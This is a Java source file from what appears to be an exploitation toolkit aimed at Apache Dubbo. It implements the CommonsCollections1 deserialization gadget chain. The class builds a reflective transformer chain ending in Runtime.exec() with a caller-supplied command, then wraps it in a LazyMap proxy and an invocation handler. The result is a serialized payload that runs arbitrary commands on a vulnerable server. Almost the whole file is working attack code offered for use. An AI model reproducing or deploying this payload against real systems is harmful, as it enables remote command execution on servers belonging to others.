package com.threedr3am.exp.dubbo.payload.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import com.threedr3am.exp.dubbo.utils.JavaVersion;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */

/**
 * commons-collections:commons-collections:3.1
 */
public class CommonsCollections1 implements Payload {

  private String[] args;

  public static boolean isApplicableJavaVersion() {
    return JavaVersion.isAnnInvHUniversalMethodImpl();
  }

  /**
   *
   * @param args
   *
   * arg[0]=cmd
   *
   * @return
   * @throws Exception
   */
  @Override
  public Object getPayload(String[] args) throws Exception {
    if (this.args != null)
      args = this.args;
    final String[] execArgs = args;
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{new ConstantTransformer(1)});
    // real chain for after setup
    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{
            Object.class, Object[].class}, new Object[]{
            null, new Object[0]}),
        new InvokerTransformer("exec",
            new Class[]{execArgs.length > 1 ? String[].class : String.class}, execArgs.length > 1 ? new Object[]{execArgs} : execArgs),
        new ConstantTransformer(1)};

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, "iTransformers",
        transformers); // arm with actual transformer chain

    return handler;
  }

  @Override
  public void injectDefaultArgs(String[] args) {
    this.args = args;
  }

}
